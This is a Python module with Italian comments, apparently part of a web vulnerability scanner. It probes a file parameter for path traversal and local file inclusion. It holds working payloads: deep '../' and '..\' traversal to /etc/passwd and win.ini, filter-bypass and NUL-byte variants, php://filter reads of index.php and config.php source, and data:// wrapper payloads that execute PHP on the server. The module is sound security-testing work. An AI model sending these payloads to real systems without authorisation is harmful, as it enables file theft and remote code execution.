"""Lane Path Traversal / LFI — un parametro che porta un NOME DI FILE viene usato
dal server per leggere un file: se non è confinato alla radice, `../` esce e
legge file arbitrari (Local File Inclusion / arbitrary file read, CWE-22/98).

Metodo (prova OGGETTIVA via firma di un file di sistema noto):
  1. BASELINE — un nome di file innocuo (nonce casuale). GUARDIA: se la risposta
     contiene GIÀ la firma di /etc/passwd SENZA traversal, l'endpoint espone quel
     file a prescindere dal nostro input → non è attribuibile al parametro →
     la lane TACE (niente falso positivo, come la `D` del CSRF).
  2. per ogni payload di traversal (varianti anti-filtro) che punta a /etc/passwd,
     guardo se la risposta contiene la firma di /etc/passwd (`root:…:0:0:`):
       - firma presente (e assente nella baseline) → il server ha letto un file
         FUORI dalla radice → Path Traversal confermato (ALTO).
       - nessuna firma → path confinato/sanificato (o il parametro non legge file).

La firma è il *contenuto* di un file di sistema noto, non il riflesso del payload:
un endpoint che si limita a riflettere la stringa `../../etc/passwd` non produce
mai `root:x:0:0:` → nessun falso positivo. La firma È la guardia, nello stesso
spirito con cui il prodotto calcolato dell'SSTI distingue la valutazione dalla
semplice reflection.

Bersaglio aggiuntivo — `php://filter` (LFI → SOURCE DISCLOSURE). Molte app PHP
fanno `include($_GET['page'])`: un normale include di uno script PHP lo *esegue*
(niente sorgente a video), ma il wrapper
`php://filter/convert.base64-encode/resource=index.php` forza lo stream a
restituire la SORGENTE del file codificata in base64, che l'attaccante decodifica
offline. Qui la firma non è il contenuto di un file di sistema ma un **blob
base64 che DECODIFICA a sorgente PHP** (`<?php`): una stringa `php://filter/...`
semplicemente riflessa NON decodifica mai a `<?php` → la decodifica a sorgente È
la guardia anti falso positivo (stesso spirito del prodotto calcolato dell'SSTI).

Bersaglio aggiuntivo — `data://` wrapper (LFI → RCE). Dove `php://filter` SVELA la
sorgente, il wrapper `data://text/plain;base64,<payload>` fa INCLUDERE ed ESEGUIRE
dal server lo stream scelto dall'attaccante (PHP con `allow_url_include=On`): è
file inclusion che diventa **esecuzione di codice**. Qui la prova non è il
contenuto di un file né una sorgente, ma il **PRODOTTO CALCOLATO** di una piccola
espressione PHP incorporata nello stream (`<?php echo 'marker'; echo 887*883; ?>`):
se la risposta contiene `marker+783221` il server ha *eseguito* il codice, non
l'ha riflesso — un endpoint che si limita a rimandare la stringa `data://...`
(anche decodificando il base64) NON produce mai il prodotto → la valutazione È la
guardia anti falso positivo, **identica** nello spirito a quella dell'SSTI (il
prodotto distingue l'esecuzione dalla semplice reflection). Il marker è casuale
per run → nessuna collisione.

ATTIVO: manda payload, SOLO host in allowlist (il confine vive in core.probe).
"""

import base64
import json
import re
import secrets
from urllib.parse import urlencode

from core import finding, probe, as_curl

# Firme oggettive di file di sistema noti: è il *contenuto* di un file noto (non
# il riflesso del payload) → è questa la prova del read.
#   Unix /etc/passwd → una riga 'root:<x>:0:0:…'.
#   Windows \windows\win.ini → una sezione INI canonica '[fonts]'/'[extensions]'/…
_PASSWD_SIG = re.compile(r"root:[^\n:]*:0:0:")
_WININI_SIG = re.compile(r"\[\s*(?:extensions|fonts|mci extensions|files|mail)\s*\]", re.I)

# php://filter source-disclosure: un run base64 "lungo" nella risposta; se DECODIFICA
# a byte che contengono un tag di apertura PHP (`<?php`) è la sorgente svelata.
_B64_RUN = re.compile(r"[A-Za-z0-9+/]{40,}={0,2}")
_PHP_OPEN = b"<?php"

# data:// wrapper → RCE: la firma è il PRODOTTO CALCOLATO di un'espressione PHP
# incorporata nello stream (come l'SSTI). Fattori distinti: il prodotto NON è
# sottostringa del letterale "887*883", così `marker+prodotto` è inconfondibile.
_DATA_A, _DATA_B = 887, 883
_DATA_PROD = _DATA_A * _DATA_B                    # 783221

_DEPTH = 12


def _re_matcher(rx):
    """Adatta una firma-regex all'interfaccia matcher(body) → (ok, evidenza)."""
    def _m(body):
        m = rx.search(body)
        return (True, f"firma '{m.group(0)}'") if m else (False, None)
    return _m


def _b64try(blob):
    """Decodifica un blob base64 (padding corretto). None se non è base64 valido.
    Lunghezza ≡ 1 (mod 4) è impossibile per il base64 → scartata."""
    pad = (-len(blob)) % 4
    if pad == 3:
        return None
    try:
        return base64.b64decode(blob + "=" * pad, validate=True)
    except Exception:
        return None


def _php_src_matcher(body):
    """Cerca nel corpo un blob base64 che DECODIFICA a sorgente PHP (`<?php`): è
    la prova oggettiva del source-disclosure via php://filter. Un payload
    `php://filter/...` semplicemente RIFLESSO non decodifica mai a `<?php` →
    è questa la guardia anti falso positivo."""
    for m in _B64_RUN.finditer(body):
        raw = _b64try(m.group(0))
        if raw is not None and _PHP_OPEN in raw:
            start = raw.index(_PHP_OPEN)
            snippet = raw[start:start + 48].decode("utf-8", "replace").replace("\n", " ")
            return True, f"blob base64 che decodifica a sorgente PHP ('{snippet}…')"
    return False, None


def _data_target(marker):
    """Costruisce il bersaglio `data://` (RCE) per un `marker` casuale di run.
    Il payload incorpora una piccola espressione PHP `<?php echo 'marker'; echo
    N*M; ?>`: se il server INCLUDE ed ESEGUE lo stream data:// (allow_url_include)
    la risposta contiene `marker+prodotto` calcolato; una semplice riflessione
    (anche con decodifica del base64) NON lo produce → la valutazione è la guardia
    anti falso positivo (come il prodotto dell'SSTI). Ritorna la tupla-bersaglio
    (etichetta, verdetto, matcher, payloads) nel formato di `_TARGETS`."""
    php = "<?php echo '%s'; echo %d*%d; ?>" % (marker, _DATA_A, _DATA_B)
    b64 = base64.b64encode(php.encode()).decode()
    expected = marker + str(_DATA_PROD)              # es. ar1es9f2c783221 (ESEGUITO)

    def _m(body):
        if expected in body:
            return True, (f"firma '{expected}' (PHP incorporato nello stream "
                          f"data:// ESEGUITO: {_DATA_A}*{_DATA_B}={_DATA_PROD} "
                          "calcolato lato server)")
        return False, None

    payloads = [
        "data://text/plain;base64," + b64,           # il wrapper classico (base64)
        "data:text/plain;base64," + b64,             # senza '//' (alcune versioni PHP)
        "data://text/plain," + php,                  # stream in chiaro (niente base64)
    ]
    return ("data:// wrapper (RCE)", "VULNERABILE (RCE → data:// wrapper)", _m, payloads)


# Bersagli: ognuno è (etichetta, verdetto, matcher, lista-payload). Il traversal
# profondo (molti '../' o '..\') raggiunge la radice da qualunque profondità di
# document-root (gli '..' in eccesso restano fermi alla radice). I bersagli Unix e
# Windows differiscono per OS (la firma dipende dal file di sistema noto); il terzo
# bersaglio NON legge un file di sistema ma la SORGENTE di uno script via wrapper
# PHP. Si prova il primo payload che colpisce.
#   - La variante `%00` (NUL-byte) tronca un'estensione eventualmente APPESA dal
#     server (file-server legacy che serve solo .pdf/.jpg e passa la stringa a una
#     open() C): un '<path>\0.jpg' scopre il file vero scartando l'estensione.
# Nota onesta: l'encoding del parametro è uniforme (urlencode per query/form, JSON
# per il body), quindi le evasioni WAF a doppio-encoding del parametro non sono
# modellate — qui si prova il traversal, non il bypass del filtro perimetrale.
_TARGETS = [
    ("/etc/passwd (Unix)", "VULNERABILE (Path Traversal)", _re_matcher(_PASSWD_SIG), [
        "../" * _DEPTH + "etc/passwd",                 # traversal semplice (il vettore classico)
        "....//" * _DEPTH + "etc/passwd",              # bypass del replace single-pass '../'→''
        "/etc/passwd",                                 # path assoluto (join ignora la radice)
        "../" * _DEPTH + "etc/passwd\x00.jpg",         # troncatura NUL di un'estensione appesa
    ]),
    ("\\windows\\win.ini (Windows)", "VULNERABILE (Path Traversal)", _re_matcher(_WININI_SIG), [
        "..\\" * _DEPTH + "windows\\win.ini",          # traversal backslash semplice
        "..\\" * _DEPTH + "windows\\win.ini\x00.jpg",  # backslash + troncatura NUL legacy
        "../" * _DEPTH + "windows/win.ini\x00.jpg",    # forward-slash (Windows: \ ≡ /) + NUL
        "C:\\windows\\win.ini",                        # path assoluto Windows (join ignora la radice)
        "C:\\windows\\win.ini\x00.jpg",                # assoluto + troncatura NUL
    ]),
    ("php://filter → sorgente PHP", "VULNERABILE (LFI → source disclosure)", _php_src_matcher, [
        "php://filter/convert.base64-encode/resource=index.php",       # il wrapper classico
        "php://filter/read=convert.base64-encode/resource=index.php",  # sintassi `read=` alternativa
        "php://filter/convert.base64-encode/resource=config.php",      # bersaglio-segreti classico
        "php://filter/convert.base64-encode/resource=" + "../" * _DEPTH + "index.php",  # wrapper + traversal
    ]),
]


def _send(url, param, payload, method, send_as, other, session=None):
    """Costruisce e manda la richiesta con `payload` in `param`. Ritorna
    (resp, u, h, b) così il PoC curl nasce dalla STESSA tripla inviata. `session`
    (Cookie/Bearer/header) raggiunge la superficie LOGGATA: un download/include
    dietro l'autenticazione è invisibile senza la sessione (login wall)."""
    o = dict(other or {})
    o[param] = payload
    if send_as == "json":
        u, h, b = url, {"Content-Type": "application/json"}, json.dumps(o)
    elif send_as == "form":
        u, h, b = url, {"Content-Type": "application/x-www-form-urlencoded"}, urlencode(o)
    else:  # query string
        sep = "&" if "?" in url else "?"
        u, h, b = url + sep + urlencode(o), {}, None
    return probe(u, method, h, b, session=session), u, h, b


def _disp(payload):
    """Rende un payload stampabile: un NUL grezzo diventa '%00' (come viaggia sul
    filo, urlencoded), così non sporca referto/JSON/terminale."""
    return payload.replace("\x00", "%00")


def traversal_probe(url, param="file", method="GET", send_as="query", other=None, session=None):
    # 1 — baseline con nome innocuo. GUARDIA: se una firma c'è già qui, l'endpoint
    # espone quel file a prescindere dal nostro input → nessun traversal dimostrato
    # dal parametro → la lane tace (anti falso positivo, come la `D` del CSRF).
    nonce = "aries_" + secrets.token_hex(4) + ".txt"
    # Il bersaglio data:// (RCE) dipende da un marker casuale di run (il prodotto
    # PHP da cercare), quindi è costruito qui e accodato ai bersagli statici.
    targets = _TARGETS + [_data_target("ar1es" + secrets.token_hex(3))]
    base_resp, _, _, _ = _send(url, param, nonce, method, send_as, other, session=session)
    if "error" in base_resp:
        return finding(f"traversal:{param}", url, "ERRORE", "info",
                       "probe fallita (baseline)", base_resp["error"])
    base_body = base_resp.get("body_head", "")
    for label, _verdict, matcher, _ in targets:
        ok, _ev = matcher(base_body)
        if ok:
            return finding(f"traversal:{param}", url, "esposizione non attribuibile", "ok",
                           "la risposta contiene la firma di un file di sistema ANCHE "
                           "senza traversal → non attribuibile al parametro (nessun "
                           "traversal dimostrato)",
                           f"baseline col nome innocuo '{nonce}' già contiene la firma "
                           f"di {label}")

    # 2 — per ogni bersaglio prova i suoi payload; la firma del CONTENUTO (file di
    # sistema noto, o sorgente PHP decodificata dal base64) è l'unica evidenza —
    # un payload riflesso crudo non la produce.
    last_err = None
    n_payloads = 0
    for label, verdict, matcher, payloads in targets:
        for payload in payloads:
            n_payloads += 1
            resp, u, h, b = _send(url, param, payload, method, send_as, other, session=session)
            if "error" in resp:
                last_err = resp["error"]
                continue
            ok, ev = matcher(resp.get("body_head", ""))
            if ok:
                return finding(f"traversal:{param}", url, verdict, "high",
                               "il parametro di file non è confinato alla radice: il "
                               "traversal esce e legge un file di sistema, il wrapper "
                               "php://filter svela la sorgente di uno script, oppure il "
                               "wrapper data:// fa includere ed ESEGUIRE uno stream "
                               "scelto dall'attaccante (Local File Inclusion / "
                               "arbitrary file read / source disclosure / RCE)",
                               f"iniettato '{_disp(payload)}', la risposta contiene la "
                               f"prova di {label}: {ev}",
                               as_curl(u, method, h, b, session=session))

    if last_err:
        return finding(f"traversal:{param}", url, "ERRORE", "info", "probe fallita", last_err)
    return finding(f"traversal:{param}", url, "nessun file-read fuori radice", "ok",
                   "nessun payload di traversal ha prodotto la firma di un file di "
                   "sistema, una sorgente svelata via php://filter, né l'esecuzione "
                   "di uno stream data:// (path confinato/sanificato, wrapper "
                   "disabilitati, o il parametro non legge/include file)",
                   f"provati {n_payloads} payload (Unix /etc/passwd + Windows "
                   "\\windows\\win.ini, inclusa la troncatura NUL, + php://filter "
                   "source-disclosure + data:// RCE), nessuna prova nella risposta")


def run(url, param="file", send_as="query", method="GET", other=None, session=None):
    return [traversal_probe(url, param=param, method=method, send_as=send_as, other=other, session=session)]
